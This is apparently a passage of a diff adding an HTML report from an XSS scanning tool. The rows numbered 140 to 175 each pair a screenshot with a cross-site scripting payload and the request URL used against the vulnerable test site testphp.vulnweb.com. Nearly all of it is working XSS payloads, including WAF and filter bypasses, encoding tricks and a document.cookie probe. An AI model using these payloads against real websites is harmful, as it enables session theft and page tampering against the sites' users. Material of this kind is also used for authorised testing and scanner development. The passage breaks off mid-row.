+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_22_159.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;--`&lt;img/src=` onerror=confirm``> --!></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c--%60%3cimg%2fsrc%3d%60+onerror%3dconfirm%60%60%3e+--!%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c--%60%3cimg%2fsrc%3d%60+onerror%3dconfirm%60%60%3e+--!%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>140</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_22_282.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>xyz&#39;;&quot;/>&lt;/textarea>&lt;Img Src=OnXSS OnError=prompt(document.cookie)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=xyz%27%3b%22%2f%3e%3c%2ftextarea%3e%3cImg+Src%3dOnXSS+OnError%3dprompt(document.cookie)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=xyz%27%3b%22%2f%3e%3c%2ftextarea%3e%3cImg+Src%3dOnXSS+OnError%3dprompt(document.cookie)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>141</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_22_789.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>alert(/Chrome%20XSS%20filter%20bypass/);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(%2fChrome%2520XSS%2520filter%2520bypass%2f)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(%2fChrome%2520XSS%2520filter%2520bypass%2f)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>142</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_23_211.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg/onload=&#39;alert&amp;#40 23 &amp;#41&#39;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fonload%3d%27alert%26%2340+23+%26%2341%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fonload%3d%27alert%26%2340+23+%26%2341%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>143</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_23_427.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;&lt;SCRIPT>alert(1);//&lt;&lt;/SCRIPT></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c%3cSCRIPT%3ealert(1)%3b%2f%2f%3c%3c%2fSCRIPT%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c%3cSCRIPT%3ealert(1)%3b%2f%2f%3c%3c%2fSCRIPT%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>144</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_24_208.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;audio src onloadstart=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3caudio+src+onloadstart%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3caudio+src+onloadstart%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>145</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_24_355.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>xxxxxxxxx&#39;});});&lt;/script>&lt;script>prompt(&quot;PLEASE%20\nSUBSCRIBE&quot;)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=xxxxxxxxx%27%7d)%3b%7d)%3b%3c%2fscript%3e%3cscript%3eprompt(%22PLEASE%2520%5cnSUBSCRIBE%22)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=xxxxxxxxx%27%7d)%3b%7d)%3b%3c%2fscript%3e%3cscript%3eprompt(%22PLEASE%2520%5cnSUBSCRIBE%22)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>146</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_24_406.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>“=””’>&lt;/>&lt;script>&lt;/script>&lt;svg onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%e2%80%9c%3d%e2%80%9d%e2%80%9d%e2%80%99%3e%3c%2f%3e%3cscript%3e%3c%2fscript%3e%3csvg+onload%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%e2%80%9c%3d%e2%80%9d%e2%80%9d%e2%80%99%3e%3c%2f%3e%3cscript%3e%3c%2fscript%3e%3csvg+onload%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>147</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_24_409.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src=x onError=&quot;`${x}`;alert(`XSS`);&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%3dx+onError%3d%22%60%24%7bx%7d%60%3balert(%60XSS%60)%3b%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%3dx+onError%3d%22%60%24%7bx%7d%60%3balert(%60XSS%60)%3b%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>148</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_25_185.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>\&quot;>&lt;img src=x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%5c%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%5c%22%3e%3cimg+src%3dx+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>149</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_25_542.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;audio src=&quot;nonexistent.mp3&quot; onerror=&quot;alert(1)&quot;>&lt;/audio></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3caudio+src%3d%22nonexistent.mp3%22+onerror%3d%22alert(1)%22%3e%3c%2faudio%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3caudio+src%3d%22nonexistent.mp3%22+onerror%3d%22alert(1)%22%3e%3c%2faudio%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>150</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_25_819.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg onload=prompt&amp;#x000000028;document.domain)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3dprompt%26%23x000000028%3bdocument.domain)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3dprompt%26%23x000000028%3bdocument.domain)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>151</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_26_52.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>1&#39;&quot;();&lt;test>&lt;ScRiPt>window.alert(&quot;XSS_WAF_BYPASS&quot;)&lt;/ScRiPt></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=1%27%22()%3b%3ctest%3e%3cScRiPt%3ewindow.alert(%22XSS_WAF_BYPASS%22)%3c%2fScRiPt%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=1%27%22()%3b%3ctest%3e%3cScRiPt%3ewindow.alert(%22XSS_WAF_BYPASS%22)%3c%2fScRiPt%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>152</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_26_458.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>alert(document.domain)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(document.domain)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(document.domain)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>153</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_26_469.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cbody%2fonload%3d%26lt%3b!--%26gt%3b%26%2310alert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cbody%2fonload%3d%26lt%3b!--%26gt%3b%26%2310alert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>154</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_26_479.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;input onfocus=javascript:alert(1) autofocus></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cinput+onfocus%3djavascript%3aalert(1)+autofocus%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cinput+onfocus%3djavascript%3aalert(1)+autofocus%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>155</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_26_899.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg onload=alert(&quot;&quot;)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3dalert(%22%22)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3dalert(%22%22)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>156</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_27_617.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>a\u006cert(1);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ea%5cu006cert(1)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ea%5cu006cert(1)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>157</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_27_783.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%20&lt;img src=1 onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2520%3cimg+src%3d1+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2520%3cimg+src%3d1+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>158</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_28_155.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img onerror=a&amp;#x006c;ert(1) src=a></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+onerror%3da%26%23x006c%3bert(1)+src%3da%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+onerror%3da%26%23x006c%3bert(1)+src%3da%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>159</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_28_740.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svgonload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%0conload%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%0conload%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>160</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_29_184.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>>&#39;&quot;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3e%27%22%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3e%27%22%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>161</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_29_756.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>q=&quot;>&lt;img/src/onerror=.1|alert`` class=d></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=q%3d%22%3e%3cimg%2fsrc%2fonerror%3d.1%7calert%60%60+class%3dd%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=q%3d%22%3e%3cimg%2fsrc%2fonerror%3d.1%7calert%60%60+class%3dd%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>162</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_29_855.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>prompt(document.domain)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3eprompt(document.domain)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3eprompt(document.domain)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>163</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_30_148.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;audio src/onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3caudio+src%2fonerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3caudio+src%2fonerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>164</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_30_257.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script /**/>/**/alert(1)/**/&lt;/script /**/</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript+%2f**%2f%3e%2f**%2falert(1)%2f**%2f%3c%2fscript+%2f**%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript+%2f**%2f%3e%2f**%2falert(1)%2f**%2f%3c%2fscript+%2f**%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>165</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_30_409.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;--`&lt;img/src=` onerror=alert(1)> --!></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c--%60%3cimg%2fsrc%3d%60+onerror%3dalert(1)%3e+--!%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c--%60%3cimg%2fsrc%3d%60+onerror%3dalert(1)%3e+--!%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>166</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_30_491.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg/OnLoad=&quot;`${prompt``}`&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fOnLoad%3d%22%60%24%7bprompt%60%60%7d%60%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fOnLoad%3d%22%60%24%7bprompt%60%60%7d%60%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>167</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_31_92.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;video src=1 onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cvideo+src%3d1+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cvideo+src%3d1+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>168</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_31_934.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%3E&#39;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%253E%27%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%253E%27%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>169</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_32_12.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2f%26%2309%3b%26%2310%3b%26%2311%3b+src%3d%60%7e%60+onerror%3dprompt(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2f%26%2309%3b%26%2310%3b%26%2311%3b+src%3d%60%7e%60+onerror%3dprompt(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>170</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_34_147.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;&quot;/>&lt;img src= x onerror=prompt(/xss/)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%27%22%2f%3e%3cimg+src%3d+x+onerror%3dprompt(%2fxss%2f)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%27%22%2f%3e%3cimg+src%3d+x+onerror%3dprompt(%2fxss%2f)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>171</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_34_750.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe srcdoc=&#39;&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;&#39;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+srcdoc%3d%27%26lt%3bbody+onload%3dprompt%26lpar%3b1%26rpar%3b%26gt%3b%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+srcdoc%3d%27%26lt%3bbody+onload%3dprompt%26lpar%3b1%26rpar%3b%26gt%3b%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>172</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_34_859.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>alert()&lt;/script>”/>&lt;/style></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert()%3c%2fscript%3e%e2%80%9d%2f%3e%3c%2fstyle%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert()%3c%2fscript%3e%e2%80%9d%2f%3e%3c%2fstyle%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>173</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_35_307.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;sCRipT>alert(1)&lt;/sCRiPt></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csCRipT%3ealert(1)%3c%2fsCRiPt%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csCRipT%3ealert(1)%3c%2fsCRiPt%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>174</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_36_721.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;sCript>confirm()&lt;/sCript></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csCript%3econfirm()%3c%2fsCript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csCript%3econfirm()%3c%2fsCript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>175</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_36_936.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;/>&lt;svg/onload=prompt(1)></td>
